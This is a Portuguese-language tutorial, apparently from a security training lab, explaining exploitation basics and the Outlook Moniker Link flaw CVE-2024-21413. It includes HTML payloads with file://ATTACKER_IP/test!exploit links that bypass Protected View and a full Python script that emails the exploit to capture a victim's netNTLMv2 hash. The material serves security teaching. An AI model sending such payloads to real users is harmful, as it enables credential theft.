# O básico da exploração
A exploração de vulnerabilidades é o ato de utilizar falhas de segurança em sistemas, redes ou aplicações para obter acesso não autorizado ou realizar ações maliciosas. Essa prática é comum tanto entre hackers criminosos quanto entre pesquisadores de segurança que buscam identificar e corrigir falhas. 

## O que é vulnerabilidade?
Vulnerabilidade é uma fraqueza em um sistema que pode ser explorada para comprometer sua segurança, seja por meio de erros de programação, configurações inadequadas ou falhas de projeto. 

Tipos de exploração:
* Exploração de vulnerabilidades conhecidas: Utilização de falhas já identificadas e para as quais existem correções disponíveis, mas que ainda não foram aplicadas em todos os sistemas. 
* Exploração de vulnerabilidades de dia zero: Ataques que exploram falhas ainda não divulgadas e para as quais não existem correções, tornando a defesa mais difícil. 
* Engenharia social: Manipulação de pessoas para que revelem informações confidenciais ou realizem ações que comprometam a segurança do sistema.

## Exemplo de vulnerabilidade

### Moniker Link (CVE-2024-21413)
O Outlook pode analisar hiperlinks como HTTP e HTTPS. No entanto, também pode abrir URLs que especificam aplicativos, conhecidos como [Moniker Links](https://learn.microsoft.com/en-us/windows/win32/com/url-monikers). Normalmente, o Outlook emite um aviso de segurança quando aplicativos externos são acionados.

<img width="361" height="229" alt="image" src="https://github.com/user-attachments/assets/0dbd04bb-5d2c-46d0-bede-db41972fb996" />

Este pop-up é resultado do "Modo de Exibição Protegido" do Outlook. O Modo de Exibição Protegido abre e-mails contendo anexos, hiperlinks e conteúdo semelhante em modo somente leitura, bloqueando itens como macros (especialmente de fora da organização).

Usando o Moniker Link ```file://``` em nosso hiperlink, podemos instruir o Outlook a tentar acessar um arquivo, como um arquivo em um compartilhamento de rede (```<a href="file://ATTACKER_IP/test">Clique aqui</a>```). O protocolo SMB é usado, o que envolve o uso de credenciais locais para autenticação. No entanto, o "Modo de Exibição Protegido" do Outlook detecta e bloqueia essa tentativa.

```<p><a href="file://ATTACKER_MACHINE/test">Clique aqui</a></p>```

A vulnerabilidade aqui existe ao modificar nosso hiperlink para incluir o caractere especial ! e algum texto em nosso Moniker Link, o que resulta em ignorar o Modo de Exibição Protegido do Outlook. Por exemplo:

```<a href="file://ATTACKER_IP/test!exploit">Clique aqui</a>```.

```<p><a href="file://ATTACKER_MACHINE/test!exploit">Clique aqui</a></p>```

Nós, como invasores, podemos fornecer um Moniker Link dessa natureza para o ataque. Observe que o compartilhamento não precisa existir no dispositivo remoto, pois uma tentativa de autenticação será feita de qualquer maneira, resultando no envio do hash netNTLMv2 do Windows da vítima para o invasor.

A Execução Remota de Código (RCE) é possível porque os Links de Moniker usam o Modelo de Objeto Componente (COM) no Windows. No entanto, explicar isso está fora do escopo desta sala, pois não há nenhuma prova de conceito divulgada publicamente para obter RCE por meio deste CVE específico.

Nós, como invasores, podemos fornecer um Moniker Link dessa natureza para o ataque. Observe que o compartilhamento não precisa existir no dispositivo remoto, pois uma tentativa de autenticação será feita de qualquer maneira, resultando no envio do hash ```netNTLMv2``` do Windows da vítima para o invasor.

**Reforço de conhecimento**

```
P: Que tipo de Link de Moniker usamos no hiperlink?
R: file://

P: Qual é o caractere especial usado para ignorar o "Modo de Exibição Protegido" do Outlook?
R: !
```

## Script de Exploração
O objetivo, como invasor, é criar um e-mail para a vítima com um Moniker Link que contorne o "Modo de Exibição Protegido" do Outlook, onde o cliente da vítima tentará carregar um arquivo da máquina invasora, resultando na captura do hash netNTLMv2 da vítima.

Utilizarei um script do autor CMNatic

```
'''
Author: CMNatic | https://github.com/cmnatic
Version: 1.0 | 19/02/2024
'''

import smtplib
from email.mime.text import MIMEText
from email.mime.multipart import MIMEMultipart
from email.utils import formataddr

sender_email = 'attacker@monikerlink.thm' # Replace with your sender email address
receiver_email = 'victim@monikerlink.thm' # Replace with the recipient email address
password = input("Enter your attacker email password: ")
html_content = """\
<!DOCTYPE html>
<html lang="en">
    <p><a href="file://ATTACKER_MACHINE/test!exploit">Click me</a></p>

    </body>
</html>"""

message = MIMEMultipart()
message['Subject'] = "CVE-2024-21413"
message["From"] = formataddr(('CMNatic', sender_email))
message["To"] = receiver_email

# Convert the HTML string into bytes and attach it to the message object
msgHtml = MIMEText(html_content,'html')
message.attach(msgHtml)

server = smtplib.SMTP('MAILSERVER', 25)
server.ehlo()
try:
    server.login(sender_email, password)
except Exception as err:
    print(err)
    exit(-1)

try:
    server.sendmail(sender_email, [receiver_email], message.as_string())
    print("\n Email delivered")
except Exception as error:
    print(error)
finally:
    server.quit()
```











